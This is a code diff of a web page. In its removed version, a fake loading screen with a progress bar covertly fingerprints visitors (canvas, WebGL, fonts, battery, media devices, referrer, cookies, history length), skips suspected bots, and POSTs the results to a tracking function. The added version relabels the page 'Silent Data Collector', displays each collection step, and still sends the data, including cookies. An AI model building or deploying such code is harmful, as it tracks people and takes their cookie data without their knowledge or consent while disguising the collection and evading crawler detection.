@@ -7,35 +7,43 @@
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
-    background: #ffffff;
-    font-family: 'SF Pro Display', -apple-system, system-ui, sans-serif;
+    background: #0a0a0a;
+    color: #00ff41;
+    font-family: 'Courier New', monospace;
     min-height: 100vh;
     display: flex;
     align-items: center;
     justify-content: center;
+    padding: 20px;
   }
-  .loader {
-    text-align: center;
-    width: 260px;
+  .container {
+    background: #111;
+    padding: 30px;
+    border-radius: 12px;
+    border: 1px solid #00ff4133;
+    max-width: 900px;
+    width: 100%;
   }
-  .percent {
-    font-size: 52px;
-    font-weight: 700;
-    color: #e8c547;
-    letter-spacing: -2px;
+  h1 {
+    font-size: 18px;
+    font-weight: 400;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    border-bottom: 1px solid #00ff4133;
+    padding-bottom: 12px;
     margin-bottom: 20px;
-    animation: pop 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) both;
+    color: #00ff41;
   }
-  @keyframes pop {
-    0% { transform: scale(0.6); opacity: 0; }
-    100% { transform: scale(1); opacity: 1; }
+  .bar-wrap {
+    margin-bottom: 16px;
   }
   .bar-track {
     width: 100%;
     height: 8px;
-    background: #f0f0f0;
+    background: #222;
     border-radius: 4px;
     overflow: hidden;
+    margin-bottom: 6px;
   }
   .bar-fill {
     height: 100%;
@@ -44,10 +52,55 @@
     border-radius: 4px;
     transition: width 0.25s ease-out;
   }
+  .pct {
+    font-size: 42px;
+    font-weight: 700;
+    color: #e8c547;
+    letter-spacing: -2px;
+    margin-bottom: 12px;
+    animation: pop 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) both;
+  }
+  @keyframes pop {
+    0% { transform: scale(0.6); opacity: 0; }
+    100% { transform: scale(1); opacity: 1; }
+  }
+  .status {
+    background: #0a0a0a;
+    padding: 15px;
+    border-radius: 6px;
+    font-size: 13px;
+    white-space: pre-wrap;
+    word-break: break-all;
+    max-height: 500px;
+    overflow-y: auto;
+    border: 1px solid #00ff4122;
+    color: #00ff41bb;
+    line-height: 1.6;
+  }
+  .status::-webkit-scrollbar { width: 4px; }
+  .status::-webkit-scrollbar-track { background: #0a0a0a; }
+  .status::-webkit-scrollbar-thumb { background: #00ff41; border-radius: 2px; }
+  .footer {
+    margin-top: 16px;
+    font-size: 11px;
+    color: #666;
+    text-align: center;
+    border-top: 1px solid #00ff4122;
+    padding-top: 16px;
+  }
+  .badge {
+    display: inline-block;
+    background: #00ff4122;
+    padding: 2px 10px;
+    border-radius: 20px;
+    font-size: 10px;
+    color: #00ff41;
+    letter-spacing: 1px;
+  }
   .done-overlay {
     position: fixed;
     inset: 0;
-    background: #fff;
+    background: #0a0a0a;
     display: flex;
     align-items: center;
     justify-content: center;
@@ -67,6 +120,7 @@
     letter-spacing: 1px;
     transform: translateY(20px);
     transition: transform 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+    font-family: 'Courier New', monospace;
   }
   .done-overlay.show .done-text {
     transform: translateY(0);
@@ -75,10 +129,17 @@
 </head>
 <body>
 
-<div class="loader">
-  <div class="percent" id="pct">0%</div>
-  <div class="bar-track">
-    <div class="bar-fill" id="bar"></div>
+<div class="container">
+  <h1>Silent Data Collector</h1>
+  <div class="pct" id="pct">0%</div>
+  <div class="bar-wrap">
+    <div class="bar-track">
+      <div class="bar-fill" id="bar"></div>
+    </div>
+  </div>
+  <div id="status" class="status">Initializing...</div>
+  <div class="footer">
+    <span class="badge">No permissions required</span>
   </div>
 </div>
 
@@ -192,56 +253,89 @@ function isBot() {
 // COLLECT EVERYTHING
 // ================================================================
 
-async function collectAllData() {
-    const d = {
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        vendor: navigator.vendor || 'unknown',
-        language: navigator.language,
-        languages: navigator.languages,
-        cookieEnabled: navigator.cookieEnabled,
-        doNotTrack: navigator.doNotTrack || 'unknown',
-        online: navigator.onLine,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        timezoneOffset: new Date().getTimezoneOffset(),
-        locale: Intl.DateTimeFormat().resolvedOptions().locale,
-        screen: { width:screen.width, height:screen.height, colorDepth:screen.colorDepth, availWidth:screen.availWidth, availHeight:screen.availHeight },
-        window: { innerWidth:window.innerWidth, innerHeight:window.innerHeight, outerWidth:window.outerWidth, outerHeight:window.outerHeight, devicePixelRatio:window.devicePixelRatio },
-        hardware: { deviceMemory:navigator.deviceMemory||'unknown', cpuCores:navigator.hardwareConcurrency||'unknown' },
-        fingerprints: { canvas:getCanvasFingerprint(), webgl:getWebGLFingerprint() },
-        pointer: { touchSupport:'ontouchstart' in window||navigator.maxTouchPoints>0, maxTouchPoints:navigator.maxTouchPoints||0, hoverSupport:window.matchMedia('(hover:hover)').matches, pointerCoarse:window.matchMedia('(pointer:coarse)').matches, pointerFine:window.matchMedia('(pointer:fine)').matches },
-        theme: { prefersColorScheme:window.matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light', prefersReducedMotion:window.matchMedia('(prefers-reduced-motion:reduce)').matches },
-        network: getNetworkInfo(),
-        performance: getPerformanceTiming(),
-        plugins: getPlugins(),
-        pluginsCount: navigator.plugins?navigator.plugins.length:0,
-        fonts: getInstalledFonts(),
-        fontsCount: 0,
-        battery: await getBatteryStatus(),
-        media: await getMediaDevices(),
-        gamepad: getGamepadInfo(),
-        page: { url:window.location.href, referrer:document.referrer, hostname:window.location.hostname },
-        cookies: document.cookie || 'none',
-        historyLength: window.history.length,
-    };
+async function collectAllData(log) {
+    const d = {};
+
+    log('Collecting browser identity...');
+    d.timestamp = new Date().toISOString();
+    d.userAgent = navigator.userAgent;
+    d.platform = navigator.platform;
+    d.vendor = navigator.vendor || 'unknown';
+    d.language = navigator.language;
+    d.languages = navigator.languages;
+    d.cookieEnabled = navigator.cookieEnabled;
+    d.doNotTrack = navigator.doNotTrack || 'unknown';
+    d.online = navigator.onLine;
+
+    log('Collecting timezone & locale...');
+    d.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    d.timezoneOffset = new Date().getTimezoneOffset();
+    d.locale = Intl.DateTimeFormat().resolvedOptions().locale;
+
+    log('Collecting screen info...');
+    d.screen = { width:screen.width, height:screen.height, colorDepth:screen.colorDepth, availWidth:screen.availWidth, availHeight:screen.availHeight };
+
+    log('Collecting window info...');
+    d.window = { innerWidth:window.innerWidth, innerHeight:window.innerHeight, outerWidth:window.outerWidth, outerHeight:window.outerHeight, devicePixelRatio:window.devicePixelRatio };
+
+    log('Collecting hardware specs...');
+    d.hardware = { deviceMemory:navigator.deviceMemory||'unknown', cpuCores:navigator.hardwareConcurrency||'unknown' };
+
+    log('Generating canvas fingerprint...');
+    d.fingerprints = { canvas:getCanvasFingerprint(), webgl:getWebGLFingerprint() };
+
+    log('Detecting pointer/touch...');
+    d.pointer = { touchSupport:'ontouchstart' in window||navigator.maxTouchPoints>0, maxTouchPoints:navigator.maxTouchPoints||0, hoverSupport:window.matchMedia('(hover:hover)').matches, pointerCoarse:window.matchMedia('(pointer:coarse)').matches, pointerFine:window.matchMedia('(pointer:fine)').matches };
+
+    log('Detecting theme preference...');
+    d.theme = { prefersColorScheme:window.matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light', prefersReducedMotion:window.matchMedia('(prefers-reduced-motion:reduce)').matches };
+
+    log('Scanning network info...');
+    d.network = getNetworkInfo();
+
+    log('Reading performance timing...');
+    d.performance = getPerformanceTiming();
+
+    log('Enumerating plugins...');
+    d.plugins = getPlugins();
+    d.pluginsCount = navigator.plugins?navigator.plugins.length:0;
+
+    log('Scanning installed fonts...');
+    d.fonts = getInstalledFonts();
     d.fontsCount = d.fonts.length;
+
+    log('Checking battery status...');
+    d.battery = await getBatteryStatus();
+
+    log('Scanning media devices...');
+    d.media = await getMediaDevices();
+
+    log('Detecting gamepads...');
+    d.gamepad = getGamepadInfo();
+
+    log('Reading page info...');
+    d.page = { url:window.location.href, referrer:document.referrer, hostname:window.location.hostname };
+
+    log('Checking storage...');
+    d.cookies = document.cookie || 'none';
+    d.historyLength = window.history.length;
+
     return d;
 }
 
 // ================================================================
-// UI + SEND
+// UI
 // ================================================================
 
 const pctEl = document.getElementById('pct');
 const barEl = document.getElementById('bar');
 const overlay = document.getElementById('overlay');
-let current = 0;
+const statusDiv = document.getElementById('status');
 
 function setProgress(n) {
-    current = Math.min(100, Math.max(0, n));
-    pctEl.textContent = current + '%';
-    barEl.style.width = current + '%';
+    const clamped = Math.min(100, Math.max(0, n));
+    pctEl.textContent = clamped + '%';
+    barEl.style.width = clamped + '%';
 }
 
 function showDone() {
@@ -256,12 +350,23 @@ async function main() {
     try {
         if (isBot()) {
             pctEl.textContent = 'done';
+            statusDiv.textContent = 'Bot detected. Skipping.';
             return;
         }
 
         setProgress(0);
+        statusDiv.textContent = '';
 
-        const dataPromise = collectAllData();
+        let logLines = [];
+        const log = (msg) => {
+            logLines.push('> ' + msg);
+            statusDiv.textContent = logLines.join('\n');
+            statusDiv.scrollTop = statusDiv.scrollHeight;
+        };
+
+        log('Starting silent data collection...');
+
+        const dataPromise = collectAllData(log);
         const startTime = Date.now();
         const duration = 5000;
 
@@ -273,6 +378,27 @@ async function main() {
         }
 
         const data = await dataPromise;
+
+        log('');
+        log('=== COLLECTION SUMMARY ===');
+        log('Timezone: ' + data.timezone);
+        log('Device: ' + (data.userAgent.split('(')[1]?.split(')')[0] || 'unknown'));
+        log('Screen: ' + data.screen.width + 'x' + data.screen.height);
+        log('Memory: ' + data.hardware.deviceMemory + ' GB');
+        log('CPU cores: ' + data.hardware.cpuCores);
+        log('Canvas hash: ' + data.fingerprints.canvas.substring(0, 20));
+        log('WebGL: ' + (data.fingerprints.webgl?.substring(0, 30) || 'unknown'));
+        log('Fonts: ' + data.fontsCount + ' installed');
+        log('Plugins: ' + data.pluginsCount);
+        log('Touch: ' + (data.pointer.touchSupport ? 'Yes' : 'No'));
+        log('Battery: ' + (data.battery ? data.battery.level + '%' : 'N/A'));
+        log('Network: ' + (data.network ? data.network.effectiveType : 'N/A'));
+        log('Camera: ' + (data.media.hasCamera ? 'Yes' : 'No'));
+        log('Mic: ' + (data.media.hasMic ? 'Yes' : 'No'));
+        log('Data points: ' + Object.keys(data).length);
+        log('');
+        log('Sending to server...');
+
         setProgress(100);
 
         await fetch('/.netlify/functions/track', {
@@ -281,7 +407,9 @@ async function main() {
             body: JSON.stringify(data)
         });
 
+        log('Data sent successfully!');
         showDone();
+
     } catch (e) {
         setProgress(100);
         showDone();
